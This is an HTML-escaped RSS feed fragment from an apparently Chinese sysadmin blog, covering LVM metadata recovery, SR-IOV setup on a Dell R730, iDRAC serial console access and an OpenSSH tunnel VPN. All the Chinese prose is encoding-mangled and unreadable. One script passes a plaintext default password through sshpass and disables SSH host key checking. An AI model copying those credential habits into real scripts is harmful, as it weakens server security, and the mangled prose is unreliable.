&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¢å¤æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vgcfgrestore  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…·ä½“æ¢å¤çš„æ­¥éª¤ï¼š é¦–å…ˆæŸ¥çœ‹blkidï¼Œçœ‹çœ‹ç¡¬ç›˜åˆ†åŒºçš„UUID&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;blkid  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/mapper/VolGroup-LogVol01: &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;d6d24cc3-5e4a-4f4d-a0b1-2524e727b0fe&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ext4&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda1: &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;3d0103ac-1b18-4da5-bc20-4b7a980a55c0&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ext4&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda2: &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;LVM2_member&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/mapper/VolGroup-LogVol00: &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;06fe7af0-dee5-494a-9b5b-11bf95244acd&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;swap&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥çœ‹lvmä¿¡æ¯ï¼Œæ‰¾å‡ºé‡Œé¢æ‰€æœ‰ç‰©ç†å·çš„UUIDï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;less /etc/lvm/archive/VolGroup_00000-444365108.vg  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        physical_volumes &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                pv0 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;nv&#34;&gt;device&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/dev/sda2&amp;#34;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;# Hint only&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é¦–å…ˆæ¢å¤æ‰€æœ‰çš„pvï¼Œç‰©ç†å·ï¼Œè¿™é‡Œæˆ‘ä»¬å°±ä¸€ä¸ªç‰©ç†å·ï¼Œæ‰€ä»¥æ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœæœ‰å¤šä¸ªç‰©ç†å·ï¼Œä¸€ä¸ªä¸€ä¸ªæ¥å³å¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pvcreate --uuid &lt;span class=&#34;s2&#34;&gt;&amp;#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --restorefile /etc/lvm/archive/VolGroup_00000-444365108.vg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç‰©ç†å·æ¢å¤å®Œäº†ï¼Œå†æ¢å¤lvï¼Œé€»è¾‘å·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vgcfgrestore -f /etc/lvm/archive/VolGroup_00000-444365108.vg VolGroup  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¼„å®ŒåvgdisplayæŸ¥çœ‹ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vgdisplay  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --- Volume group ---
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  VG Name               VolGroup
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  System ID             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Format                lvm2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Metadata Areas        &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Metadata Sequence No  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  VG Access             read/write
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  VG Status             resizable
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  MAX LV                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Cur LV                &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Open LV               &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Max PV                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Cur PV                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Act PV                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  VG Size               1.64 TiB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  PE Size               4.00 MiB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Total PE              &lt;span class=&#34;m&#34;&gt;428705&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Alloc PE / Size       &lt;span class=&#34;m&#34;&gt;428705&lt;/span&gt; / 1.64 TiB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Free  PE / Size       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; / &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  VG UUID               3h3yik-kmqP-Q8sC-5bn0-cwtw-SXpo-orMlKn
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°±æ¢å¤æˆåŠŸäº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>kvmæé«˜ç½‘å¡æ•ˆç‡ä½¿ç”¨SR-IOV</title>
      <link>https://rendoumi.com/posts/20240115-kvm_sriov/</link>
      <pubDate>Mon, 15 Jan 2024 11:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240115-kvm_sriov/</guid>
      <description>&lt;p&gt;ä»€ä¹ˆæ˜¯SR-IOVå‘¢?&lt;/p&gt;
&lt;p&gt;ç®€å•çš„è¯´ï¼ŒSR-IOVæ˜¯ä¸€ç§è™šæ‹ŸåŒ–æ–¹æ¡ˆï¼Œç”¨æ¥ä½¿ä¸€ä¸ªPCIeçš„ç‰©ç†è®¾å¤‡ï¼Œèƒ½è™šæ‹Ÿå‡ºå¤šä¸ªè®¾å¤‡ï¼Œè¿™äº›è™šæ‹Ÿå‡ºæ¥çš„è®¾å¤‡çœ‹èµ·æ¥å°±åƒæ˜¯å¤šä¸ªçœŸå®çš„ç‰©ç†è®¾å¤‡ä¸€æ ·ï¼Œå¹¶è·å¾—èƒ½å¤Ÿä¸æœ¬æœºæ€§èƒ½åª²ç¾çš„ I/O æ€§èƒ½ã€‚&lt;/p&gt;
&lt;p&gt;SR-IOVç°åœ¨æœ€å¤šæ˜¯ç”¨åœ¨ç½‘å¡ä¸Šï¼Œkvmè™šæ‹Ÿæœºçš„ç½‘å¡åŠŸèƒ½ä¸€èˆ¬ä¼šä¸‹é™åˆ°å®ä½“æœºçš„30-50%ï¼Œå¦‚æœæ”¹ç”¨SR-IOVä¼šå¤§å¤§æé«˜ç½‘å¡æ€§èƒ½ã€‚&lt;/p&gt;
&lt;p&gt;SR-IOV æœ‰2ç§åŠŸèƒ½ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç‰©ç†åŠŸèƒ½ (Physical Function, PF)
&lt;ul&gt;
&lt;li&gt;å°±æ˜¯æ ‡å‡†çš„PCIeçš„åŠŸèƒ½äº†&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;è™šæ‹ŸåŠŸèƒ½ (Virtual Function, VF)
&lt;ul&gt;
&lt;li&gt;ä¸ç‰©ç†åŠŸèƒ½å…³è”çš„ä¸€ç§åŠŸèƒ½ã€‚VF æ˜¯ä¸€ç§è½»é‡çº§ PCIe åŠŸèƒ½ï¼Œå¯ä»¥ä¸ç‰©ç†åŠŸèƒ½ä»¥åŠä¸åŒä¸€ç‰©ç†åŠŸèƒ½å…³è”çš„å…¶ä»– VF å…±äº«ä¸€ä¸ªæˆ–å¤šä¸ªç‰©ç†èµ„æºã€‚VF ä»…å…è®¸æ‹¥æœ‰ç”¨äºå…¶è‡ªèº«è¡Œä¸ºçš„é…ç½®èµ„æºã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¥½çš„ï¼Œå¦‚ä½•åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨å®ƒå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;åœºæ™¯å¦‚ä¸‹ï¼š &lt;img alt=&#34;image-20240115165320492&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240115-kvm_sriov/image-20240115165320492.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚ä¸Šï¼š æœºæˆ¿é‡Œæœ‰ä¸¤å°äº¤æ¢æœº:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;switch-1ç”¨æ¥è¿æ¥å„æœºå™¨çš„eth0å£&lt;/li&gt;
&lt;li&gt;switch-2ç”¨æ¥è¿æ¥å„æœºå™¨çš„eth1å£&lt;/li&gt;
&lt;li&gt;switch-1å’Œswitch-2äº’è”&lt;/li&gt;
&lt;li&gt;è¿™æ˜¯ä¸€ç§æœºæˆ¿çš„æ ‡å‡†è¿æ³•ï¼Œeth0å’Œeth1åšbondingï¼Œåšçº¿è·¯å†—ä½™&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;server-2æ˜¯ä¸€å°Dell R730çš„æœåŠ¡å™¨ï¼Œeth0è¿switch-1ï¼Œeth1è¿switch-2ï¼Œä¸Šé¢è·‘äº†ä¸‰ä¸ªè™šæœºï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VM-1è·‘åœ¨åŸºäºbondingçš„Bridgeä¸Šï¼Œæ ‡å‡†çš„åšæ³•&lt;/li&gt;
&lt;li&gt;VM-2å’ŒVM-2åˆ™æ˜¯åˆ©ç”¨äº†SR-IOVï¼Œä»è™šæ‹Ÿç½‘å¡ç›´è¿åˆ°ç‰©ç†ç½‘å¡ï¼Œå‡å°‘äº†ä¸­é—´ç¯èŠ‚ï¼Œæé«˜äº†ç½‘å¡çš„æ•ˆç‡ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é¦–å…ˆè¦æŠŠæœåŠ¡å™¨çš„vtå’Œsr-iovæ‰“å¼€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;System BIOS &amp;gt; Processor Settings &amp;gt; Virtualization Technology&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240115165609882&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240115-kvm_sriov/image-20240115165609882.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;System BIOS &amp;gt; Integrated Devices &amp;gt; SR-IOV Global Enable &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240115165640371&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240115-kvm_sriov/image-20240115165640371.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶ï¼Œè¿™ä¹ˆéº»çƒ¦çš„äº‹æƒ…ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨è„šæœ¬é€šè¿‡idracè°ƒç”¨racadmæ¥åšå¥½äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;sshpass -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxx&amp;#34;&lt;/span&gt; ssh -oStrictHostKeyChecking&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no root@10.8.&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; racadm &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; BIOS.ProcSettings.ProcVirtualization Enabled  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sshpass -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;calvin&amp;#34;&lt;/span&gt; ssh -oStrictHostKeyChecking&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no root@10.8.&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; racadm &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; BIOS.IntegratedDevices.SriovGlobalEnable Enabled  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sshpass -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxx&amp;#34;&lt;/span&gt; ssh -oStrictHostKeyChecking&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no root@10.8.&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; racadm serveraction powercycle  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼ŒDell R730çš„æœºå™¨ç”¨å¾—æ˜¯Intel I350çš„ä»¥å¤ªç½‘å¡ï¼Œæ¯ä¸ªç½‘å£æœ€å¤šæ”¯æŒ8ä¸ªVFï¼Œå¦‚æœæ˜¯é«˜çº§çš„X520ç½‘å¡ï¼Œå°±æ”¯æŒ64ä¸ªVFã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>idracè¿œç¨‹ç™»å½•æœåŠ¡å™¨</title>
      <link>https://rendoumi.com/posts/20240115-idrac_monitor/</link>
      <pubDate>Mon, 15 Jan 2024 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240115-idrac_monitor/</guid>
      <description>&lt;p&gt;Linuxçš„ç¯å¢ƒäº†ï¼Œwindowsçš„ä¸è¡Œã€‚&lt;/p&gt;
&lt;p&gt;Dellçš„idracå…¶å®æä¾›äº†è¿œç¨‹çš„sshç•Œé¢ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨idracæ¥è®¾ç½®biosä»€ä¹ˆçš„ï¼Œå½“ç„¶å¦‚æœèƒ½é€šè¿‡idracç›´æ¥ç™»å½•æœåŠ¡å™¨é‚£å°±æ›´å¥½äº†ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ™®åŠä»¥ä¸‹å‡ ä¸ªæ¦‚å¿µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;tty: Video console terminal (abbreviation for â€œTeletypeâ€)&lt;/li&gt;
&lt;li&gt;ttyS: Serial console terminal&lt;/li&gt;
&lt;li&gt;pts: Virtual console terminal (pseudo-tty or pty but stands for Pseudo-Terminal Slave (PTS))&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç®€å•è¯´ï¼Œttyæ˜¯å¸¦æ˜¾ç¤ºå™¨çš„ç»ˆç«¯ï¼ŒttySæ˜¯ä¸²å£ç»ˆç«¯ï¼Œptsæ˜¯è™šæ‹Ÿç»ˆç«¯ã€‚ttyæ¥æ˜¾ç¤ºå™¨ã€é”®ç›˜ï¼ŒttySæ¥ä¸²å£ï¼Œpstå°±æ˜¯è¿œç¨‹ssh/telnetè¿‡æ¥çš„è™šæ‹Ÿç»ˆç«¯ã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€æ­¥ï¼šä¿®æ”¹Dell Bios&lt;/p&gt;
&lt;p&gt;dellçš„biosä¸­å…³äºserialçš„é…ç½®å¦‚ä¸‹å›¾ï¼š
&lt;img alt=&#34;image-20240115164915483&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240115-idrac_monitor/image-20240115164915483.png&#34;&gt; æˆ‘ä»¬åªæ”¹å‰ä¸¤ä¸ªå°±å¯ä»¥äº†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Serial Communication: â€œOn with serial redirection via com2â€&lt;/li&gt;
&lt;li&gt;Serial Port Address: â€œSerial Device1 = COM1, Serial Device2=COM2&lt;/li&gt;
&lt;li&gt;External Serial Connector: â€œSerial Device1â€&lt;/li&gt;
&lt;li&gt;Failsafe Baud Rate: â€œ115200â€&lt;/li&gt;
&lt;li&gt;Remote Terminal Type: â€œVT100/VT220â€&lt;/li&gt;
&lt;li&gt;Redirection After Boot: â€œEnabledâ€&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Serial Communication ç¼ºçœæ˜¯ On without Console Redirectionï¼Œæˆ‘ä»¬éœ€è¦æŠŠæ‰€æœ‰consoleçš„æ˜¾ç¤ºéƒ½è½¬å‘åˆ°com2ä¸Šï¼Œæ‰€ä»¥éœ€è¦æ”¹ã€‚&lt;/li&gt;
&lt;li&gt;Serial Port Address ç¼ºçœæ˜¯ Serial Device 1=COM2, Serial Device  2=COM1ï¼Œå¦‚æœä¸æ”¹ï¼Œé‚£ä¹ˆæ¥ä¸Šç‰©ç†æœºä¸Šçš„ä¸²å£å°±å¯ä»¥çœ‹åˆ°ç™»å½•ç”»é¢äº†ï¼Œè¿™æ ·ç­‰äºä¸²å£1åºŸæ‰äº†ï¼Œä¸‡ä¸€æˆ‘ä»¬è¦æŠŠç‰©ç†æœºä¸Šçš„com1å£ç»™ç•™å‡ºæ¥å¤‡ç”¨ï¼Œæ’ä¸ªä¸²å£çš„wavecom modemåšæŠ¥è­¦ç”¨ï¼Œé‚£å°±å‚»çœ¼äº†ï¼Œæ‰€ä»¥å¿…é¡»æ”¹æ‰ç•™å‡ºcom1å¤‡ç”¨ã€‚&lt;/li&gt;
&lt;li&gt;External Serial Connector ç¼ºçœæ˜¯ Serial Device1ï¼Œä¸ç”¨æ”¹ï¼Œé‚£ä¹ˆç‰©ç†æœºä¸Šçš„comå£å°±æ˜¯com1äº†ï¼Œå¯¹åº”ttyS0ã€‚&lt;/li&gt;
&lt;li&gt;Failsafe Baud Rate: â€œ115200â€ï¼Œä¸ç”¨æ”¹ï¼Œå°±ç”¨è¿™ä¸ªé«˜çš„å¥½äº†ã€‚&lt;/li&gt;
&lt;li&gt;Remote Terminal Type: â€œVT100/VT220â€ï¼Œä¸ç”¨æ”¹ï¼Œé»‘ç™½çš„vt100å°±å¾ˆå¥½&lt;/li&gt;
&lt;li&gt;Redirection After Boot: â€œEnabledâ€ï¼Œä¹Ÿä¸ç”¨æ”¹ï¼Œéœ€è¦é‡å®šå‘ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å½“ç„¶ï¼Œç”¨è„šæœ¬ä¸€æ¬¡æå®šæ›´å¥½ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”¨opensshçš„tunnelå»ºç«‹vpn</title>
      <link>https://rendoumi.com/posts/20240115-ssh_tun_vpn/</link>
      <pubDate>Mon, 15 Jan 2024 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240115-ssh_tun_vpn/</guid>
      <description>&lt;p&gt;opensshæ˜¯æ”¯æŒéš§é“çš„ï¼Œæ‰€ä»¥å¾ˆç®€å•å°±å¯ä»¥åœ¨sshä¸­å†å¥—ä¸ªç®¡é“ï¼Œç›´æ¥ç”¨æ¥vpnï¼Œåœºæ™¯å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240115164125796&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240115-ssh_tun_vpn/image-20240115164125796.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚ä¸Šå›¾ï¼ŒAæœºèƒ½sshæ— å¯†ç ç™»å½•Bæœº&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Aæœºçš„IPï¼š172.16.8.106&lt;/p&gt;
&lt;p&gt;Bæœºçš„IPï¼š172.16.8.108&lt;/p&gt;
&lt;p&gt;Aæœºæ‹¨é€švpn tunnelåtunçš„ipï¼š192.168.244.2&lt;/p&gt;
&lt;p&gt;Bæœºæ‹¨é€švpn tunnelåtunçš„ipï¼š192.168.244.1&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;é¦–å…ˆç¼–è¾‘Aå’ŒBçš„/etc/ssh/sshd_configï¼Œå…è®¸tunnelï¼Œç¼ºçœæ˜¯ä¸å…è®¸çš„ï¼Œç„¶åservice sshd restart ï¼Œé‡å¯sshd&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PermitTunnel yes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Aå’ŒBå®‰è£…linuxä¸‹çš„tunctlè½¯ä»¶ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªtunnelè®¾å¤‡&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install tunctl  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tunctl -t tun5 -u root  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;åœ¨A(172.16.8.106)æœºå™¨ä¸Šç”Ÿæˆkeyï¼Œå¹¶è®¾ç½®èƒ½æ— å¯†ç è¯ä¹¦ç›´æ¥ç™»å½•B(172.16.8.108)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh-keygen  
